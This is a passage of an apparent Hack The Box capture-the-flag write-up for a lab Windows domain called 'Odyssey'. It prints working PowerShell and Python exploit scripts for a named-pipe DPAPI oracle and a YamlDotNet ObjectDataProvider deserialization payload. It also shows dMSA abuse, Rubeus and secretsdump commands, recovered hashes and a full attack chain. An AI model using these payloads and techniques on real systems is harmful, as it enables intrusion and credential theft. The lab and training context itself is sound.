┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ python3 create_SD.py
AQAEgBQAAAAAAAAAAAAAACAAAAABAQAAAAAABRIAAAACAFAAAgAAAAAAJAD/AQ8A...
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # Write it to msDS-GroupMSAMembership (the self-authorization)
bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build \
  -p :bbc270509ec878cf516d5295fb4d774d \
  set object 'dmsa-pipe-deploy$' msDS-GroupMSAMembership \
  --raw --b64 -v 'AQAEgBQAAAAAAAAAAAAAACAAAAABAQAAAAAABRIAAAACAFAAAgAAAAAAJAD/AQ8A...'
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # Authenticate as the dMSA
certipy-ad auth -pfx dmsa-pipe-deploy.pfx -dc-ip 172.16.0.10 \
  -username 'dmsa-pipe-deploy$' -domain odyssey.htb
# Got TGT → dmsa-pipe-deploy.ccache
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ # S4U2Self → get a ticket impersonating svc-aegis-deploy
badS4U2self \
  'kerberos+ccache://odyssey.htb\dmsa-pipe-deploy$:dmsa-pipe-deploy.ccache@172.16.0.10' \
  'krbtgt/odyssey.htb@odyssey.htb' \
  'dmsa-pipe-deploy$@odyssey.htb' --dmsa
```

```
dMSA current keys found in TGS:
RC4: 7641fccce7d70473e575a6d7e9c7df49

dMSA previous keys (including preceding managed accounts):
RC4: 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
```

The "previous keys" RC4 is `svc-aegis-deploy`'s actual NT hash — the one that was superseded by the dMSA.

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
```

We're on DC01.

***

### .NET Pipe Analysis — AegisStreamSvc

Registry hunting on DC01 (can't run service queries, so we go through the registry):

```
*Evil-WinRM* PS C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamCollector" /v ImagePath
ImagePath  REG_EXPAND_SZ  C:\Program Files\Aegis Stream Collector\AegisStreamSvc.exe

*Evil-WinRM* PS C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamCollector" /v ObjectName
ObjectName  REG_SZ  ODYSSEY\svc-aegis-stream
```

Service runs as `svc-aegis-stream`. BloodHound shows it has DCSync. This is the final target.

Download the binaries and decompile with dnSpy. The binary is a .NET 8 Windows service with one hosted worker: `PipeServerWorker`. It listens on `\\.\pipe\AegisStreamMgmt`.

#### Wire Protocol

Everything travels as `Frame` objects. The wire format:

```
[0-3]   Magic = 0xEB8B95A3  (on the wire: AB 5E 91 A3, little-endian)
[4-7]   ReqId (uint32 LE, echoed in replies)
[8-9]   OpLen (uint16 LE)
[10..] OpCode (UTF-8, no null)
[10+OL..] PayloadLen (uint32 LE)
[14+OL..] Payload
[14+OL+PL..] Signature (32 bytes, HMAC-SHA256)
```

Signature covers `OpCode || Payload`. The server infers the caller's role by trying all three keys (Operator → Auditor → Viewer) and seeing which one verifies. Role discovery is key-based, not credential-based.

#### Opcode Authorization Table

```
STREAM_LIST                  → Viewer
STREAM_GET                   → Viewer
STREAM_METRICS               → Auditor
STREAM_REPLAY                → Auditor
DIAG_DECRYPT_TELEMETRY_BLOB  → Viewer
CONFIG_EXPORT                → Operator
CONFIG_IMPORT                → Operator
MAINT_RELOAD                 → Operator
```

We're in `AegisStream-Viewers` (because `svc-aegis-deploy` is a member of that group), so we can connect to the pipe and call Viewer-level opcodes. We can also read `viewer.key` and `auditor.key` directly from disk — they're cleartext.

The `operator.key` is protected: it's AES-GCM encrypted (`operator.key.enc`), with the key-encryption-key itself DPAPI-wrapped under the service account (`operator.wrap.bin`). However — and this is the critical flaw — `BootstrapOperatorEncryption` **never deletes the cleartext `operator.key`**. It reads it, encrypts it, and just... leaves it there. Except we can't read `operator.key` directly because the ACL restricts it to `svc-aegis-stream`.

***

### DPAPI Oracle via DIAG\_DECRYPT\_TELEMETRY\_BLOB

Here's what `HandleDiagDecrypt` actually does with the payload:

```csharp
byte[] wrappedKek = frame.Payload;
byte[] kek = ProtectedData.Unprotect(wrappedKek, null, DataProtectionScope.CurrentUser);
// then returns kek as the reply body
```

It calls `ProtectedData.Unprotect` on **whatever bytes we send as the payload**, under the service account's `CurrentUser` scope. `operator.wrap.bin` is exactly a `CurrentUser` DPAPI blob created by that service account. We can read `operator.wrap.bin` from disk (our group has RX on it). We send those bytes as the payload of a Viewer-signed frame. The service unwraps it and hands us the KEK in the response.

```powershell
# oracle_decrypt.ps1
$viewerKey = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/keys/viewer.key')
$wrapBlob  = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/dpapi/operator.wrap.bin')
$opBytes   = [Text.Encoding]::UTF8.GetBytes('DIAG_DECRYPT_TELEMETRY_BLOB')

$hmac      = New-Object System.Security.Cryptography.HMACSHA256(,$viewerKey)
$signData  = New-Object byte[] ($opBytes.Length + $wrapBlob.Length)
[Array]::Copy($opBytes, 0, $signData, 0, $opBytes.Length)
[Array]::Copy($wrapBlob, 0, $signData, $opBytes.Length, $wrapBlob.Length)
$sig = $hmac.ComputeHash($signData)

$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)
$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bw.Write([int32]1)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)
$bw.Write([int32]$wrapBlob.Length); $bw.Write($wrapBlob)
$bw.Write($sig); $bw.Flush()

$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',
    [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::None,
    [System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipe.Connect(5000)
$pipe.Write($ms.ToArray(), 0, $ms.Length)
$pipe.Flush()

$buf = New-Object byte[] 131072
$n = $pipe.Read($buf, 0, 131072)
$pipe.Dispose()

$rOpLen  = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen  = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
$rPayload = New-Object byte[] $rPlLen
[Array]::Copy($buf, 14 + $rOpLen, $rPayload, 0, $rPlLen)

[IO.File]::WriteAllBytes('C:/Users/svc-aegis-deploy/Documents/wrapper.bin', $rPayload)
Write-Output ("KEK=" + [BitConverter]::ToString($rPayload).Replace('-',''))
```

```
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> ./oracle_decrypt.ps1
KEK=D5742ED26151833792FFD2D821959E0F1B85A1F922157639A6C7EC90C094D658
```

Now decrypt `operator.key.enc` locally. The blob format is `[nonce(12) | tag(16) | ciphertext(N)]`:

```python
# decrypt_operator.py
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64

kek  = bytes.fromhex('D5742ED26151833792FFD2D821959E0F1B85A1F922157639A6C7EC90C094D658')
blob = open('operator.key.enc', 'rb').read()   # download from target first

nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
op_key = AESGCM(kek).decrypt(nonce, ct + tag, None)
print(op_key.hex())
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ python3 decrypt_operator.py
4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c
```

We have the Operator key. The entire Operator tier of the pipe is now open.

***

### YAML Deserialization RCE → svc-aegis-stream

`CONFIG_IMPORT` (Operator-gated) does this:

```csharp
string yaml = Encoding.UTF8.GetString(frame.Payload);
IDeserializer deserializer = new DeserializerBuilder()
    .WithNodeTypeResolver(new TypeNameInTagNodeTypeResolver())  // <-- the bug
    .Build();
object config = deserializer.Deserialize<object>(new StringReader(yaml));
_config.Apply(config);
```

`TypeNameInTagNodeTypeResolver` is marked `[Obsolete]` by YamlDotNet's own authors. What it does: strip the leading `!` from a YAML tag, pass the rest to `Type.GetType()`. If the type resolves, it becomes the deserialization target. The target type here is `object` — no constraint at all.

`AegisStreamSvc.runtimeconfig.json` includes `Microsoft.WindowsDesktop.App` framework, which loads `PresentationFramework.dll` — the WPF assembly. That assembly contains `System.Windows.Data.ObjectDataProvider`, a well-known .NET deserialization gadget that auto-invokes `MethodName` on `ObjectInstance` during property assignment.

The only snag: assembly-qualified names contain commas, and commas are problematic in YAML tags. The fix: YamlDotNet's scanner decodes percent-encoding in tag URIs. `%2C` → `,`. The scanner consumes `%`, `2`, `C` as three characters and emits one comma character — which then gets passed cleanly to `Type.GetType()`.

**The payload:**

```yaml
--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework
ObjectInstance:
  !System.Diagnostics.Process%2CSystem.Diagnostics.Process
  StartInfo:
    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process
    FileName: cmd.exe
    Arguments: '/c whoami > C:\ProgramData\AegisStream\logs\rce.txt'
MethodName: Start
```

Sending it via the pipe with the operator key:

```powershell
# config_import.ps1
$opKeyHex = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
$opKey = [byte[]]::new(32)
for ($i = 0; $i -lt 32; $i++) {
    $opKey[$i] = [Convert]::ToByte($opKeyHex.Substring($i*2, 2), 16)
}

$nl = [char]10
$yaml = "--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework" + $nl +
        "ObjectInstance:" + $nl +
        "  !System.Diagnostics.Process%2CSystem.Diagnostics.Process" + $nl +
        "  StartInfo:" + $nl +
        "    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process" + $nl +
        "    FileName: cmd.exe" + $nl +
        "    Arguments: '/c whoami > C:\ProgramData\AegisStream\logs\rce.txt'" + $nl +
        "MethodName: Start"

$payload = [Text.Encoding]::UTF8.GetBytes($yaml)
$opBytes = [Text.Encoding]::UTF8.GetBytes('CONFIG_IMPORT')

$hmac = New-Object System.Security.Cryptography.HMACSHA256(,$opKey)
$signData = New-Object byte[] ($opBytes.Length + $payload.Length)
[Array]::Copy($opBytes, 0, $signData, 0, $opBytes.Length)
[Array]::Copy($payload, 0, $signData, $opBytes.Length, $payload.Length)
$sig = $hmac.ComputeHash($signData)

$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)
$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bw.Write([int32]1)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)
$bw.Write([int32]$payload.Length); $bw.Write($payload)
$bw.Write($sig); $bw.Flush()

$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',
    [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::None,
    [System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipe.Connect(5000)
$pipe.Write($ms.ToArray(), 0, $ms.Length); $pipe.Flush()

$buf = New-Object byte[] 131072
$n = $pipe.Read($buf, 0, 131072); $pipe.Dispose()

$rOpLen  = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen  = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
Write-Output "Status: $rOpCode | PayloadLen: $rPlLen"
```

```
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> ./config_import.ps1
Status: OK | PayloadLen: 0

*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> type C:\ProgramData\AegisStream\logs\rce.txt
odyssey\svc-aegis-stream
```

RCE as `svc-aegis-stream`.

***

### DCSync → Domain Admin

Get a TGT for `svc-aegis-stream` via Rubeus `tgtdeleg`. First get Rubeus somewhere the service account can reach it:

```
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> upload Rubeus.exe
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> icacls .\Rubeus.exe /grant Everyone:RX
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> icacls . /grant Everyone:RX
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> icacls C:\Users\svc-aegis-deploy /grant Everyone:RX
```

Update `config_import.ps1` to copy Rubeus and then run `tgtdeleg`:

```powershell
# config_import.ps1 — arguments for copy step
"    Arguments: '/c copy C:\Users\svc-aegis-deploy\Documents\Rubeus.exe C:\ProgramData\AegisStream\Rubeus.exe'" + $nl +

# then arguments for tgtdeleg step
"    Arguments: '/c C:\ProgramData\AegisStream\Rubeus.exe tgtdeleg /nowrap > C:\ProgramData\AegisStream\logs\rubeus_out.txt 2>&1'" + $nl +
```

```
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> type C:\ProgramData\AegisStream\logs\rubeus_out.txt
[*] base64(ticket.kirbi):
      doIGDDCCBgigAwIBBaEDAgEWooI...ADAgECoRcwFRsGa3JidGd0GwtPRFlTU0VZLkhUQg==
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ echo 'doIGDDCC...VZZS5IVEIg==' | base64 -d > svc-aegis-stream.kirbi
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ impacket-ticketConverter svc-aegis-stream.kirbi svc-aegis-stream.ccache
[+] done
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ KRB5CCNAME=svc-aegis-stream.ccache impacket-secretsdump \
  -k -no-pass -dc-ip 172.16.0.10 \
  "odyssey.htb/svc-aegis-stream@dc01.odyssey.htb" \
  -just-dc-user Administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:890b9e96245f6895e06adfe92ad1e81f:::
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
└─$ evil-winrm -i 172.16.0.10 -u Administrator -H 890b9e96245f6895e06adfe92ad1e81f
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
<flag>
```

***

### Attack Chain

```
[10.129.35.238:3000] aegis.korvia.htb
         |
         | NoSQL $facet sub-pipeline injection
         | → pending_invites collection dumped
         | → unredeemed operator tokens recovered
         |
         | WebAuthn synthetic authenticator registration
         | → attestation: none, locality check browser-only
         | → custom Python client bypasses localhost restriction
         |
         | userHandle confusion
         | → send b"admin" as userHandle in auth/finish
         | → server grants Administrator role
         |
         | Prototype pollution via Nunjucks merge filter
         | → Object.prototype.allowRawBlocks = true
         | → pandoc flips -raw_attribute to +raw_attribute
         |
         | LaTeX file read via \openin/\read/\message primitives
         | → clean file read below TeX typesetting layer
         | → source code enumeration: mds_diag route, MDS_DIAG_TOKEN
         |
         | CVE-2025-1302 (jsonpath-plus 10.2.0)
         | → Function constructor eval via filter expression
         | → RCE as webadmin on odyssey-web (172.16.0.12)
         |
         | Password reuse: db password → sudo
         | → root on odyssey-web
         |
[172.16.0.11] odyssey-db
         |
         | bulkadmin → BULK INSERT UNC coercion
         | → NTLMv2 hash captured (Responder)
         | → hashcat -m 5600 → cml958782 (svc-mssql)
         |
         | sysadmin → xp_cmdshell → SeImpersonatePrivilege
         | → GodPotato (Go+Donut+XOR AV evasion)
         | → SYSTEM on odyssey-db
         |
         | Registry hive dump → ODYSSEY-DB$ machine hash
         | → AddKeyCredentialLink via group inheritance chain
         | → Shadow Credentials → svc-aegis-build NT hash
         |
[172.16.0.10] dc01.odyssey.htb
         |
         | dMSA Ouroboros (post-BadSuccessor CVE-2025-53779 bypass)
         | → CreateChild on OU=Migrations
         | → bidirectional msDS-SupersededManagedAccountLink
         | → dMSA self-authorizes via msDS-GroupMSAMembership
         | → S4U2Self → svc-aegis-deploy NT hash
         |
         | WinRM as svc-aegis-deploy
         |
         | .NET named pipe reverse engineering (AegisStreamSvc)
         | → DPAPI oracle via DIAG_DECRYPT_TELEMETRY_BLOB
         | → operator.wrap.bin → KEK → operator.key.enc decrypted
         | → operator HMAC key recovered
         |
         | YAML deserialization via TypeNameInTagNodeTypeResolver
         | → ObjectDataProvider gadget (PresentationFramework)
         | → %2C encoding bypass for comma in assembly-qualified name
         | → RCE as svc-aegis-stream
         |
         | Rubeus tgtdeleg → TGT → DCSync
         | → Administrator NT hash → Domain Admin
         |
      [ROOT]
```

***

### Techniques Reference

| Technique                                                           | Where Used                                                   |
| ------------------------------------------------------------------- | ------------------------------------------------------------ |
| NoSQL Pipeline Aggregation Injection (`$facet` sub-pipeline bypass) | Reading `pending_invites` collection                         |
| WebAuthn Synthetic Authenticator Forgery                            | Bypassing hardware-only login with custom Python client      |
| `userHandle` Confusion                                              | Escalating from Operator to Administrator                    |
| Prototype Pollution (`__proto__` via Nunjucks merge filter)         | Enabling `allowRawBlocks` to unlock raw LaTeX                |
| LaTeX File Read (`\openin`, `\read`, `\message` primitives)         | Exfiltrating source code and credentials from the Linux box  |
| CVE-2025-1302 (jsonpath-plus ≤10.2.0 RCE)                           | Initial shell as `webadmin`                                  |
| Password Reuse (DB creds → sudo)                                    | Root on `odyssey-web`                                        |
| MSSQL `BULK INSERT` UNC Coercion                                    | Capturing `svc-mssql` NTLMv2 hash                            |
| NetNTLMv2 Cracking (hashcat mode 5600)                              | Recovering `svc-mssql` plaintext password                    |
| `xp_cmdshell` + `SeImpersonatePrivilege` + GodPotato                | SYSTEM on `odyssey-db`                                       |
| AV Evasion: Go + Donut + XOR + RW→RX page flip                      | Bypassing Defender on `odyssey-db`                           |
| Local Registry Hive Extraction                                      | Recovering `ODYSSEY-DB$` machine account hash                |
| Bloodhound Shortest Path Analysis                                   | Discovering `AddKeyCredentialLink` inheritance chain         |
| Shadow Credentials / `msDS-KeyCredentialLink` Write                 | Compromising `svc-aegis-build`                               |
| dMSA Ouroboros (post-patch BadSuccessor variant)                    | Compromising `svc-aegis-deploy` via `OU=Migrations`          |
| .NET Binary Reverse Engineering (dnSpy)                             | Understanding `AegisStreamSvc` wire protocol and key storage |
| DPAPI Oracle via Named Pipe (`DIAG_DECRYPT_TELEMETRY_BLOB`)         | Recovering operator KEK                                      |
| AES-GCM Decryption (`operator.key.enc`)                             | Recovering operator HMAC key                                 |
| Unsafe YAML Deserialization (`TypeNameInTagNodeTypeResolver`)       | RCE as `svc-aegis-stream`                                    |
| `ObjectDataProvider` Gadget Chain (WPF)                             | Triggering process execution via YAML deserialization        |
| `%2C` Percent-Encoding in YAML Tags                                 | Smuggling comma in assembly-qualified type names             |
| Rubeus `tgtdeleg`                                                   | Capturing `svc-aegis-stream` TGT for DCSync                  |
| DCSync (`impacket-secretsdump`)                                     | Dumping Administrator hash                                   |
| Pass-the-Hash (evil-winrm)                                          | Domain Admin access                                          |
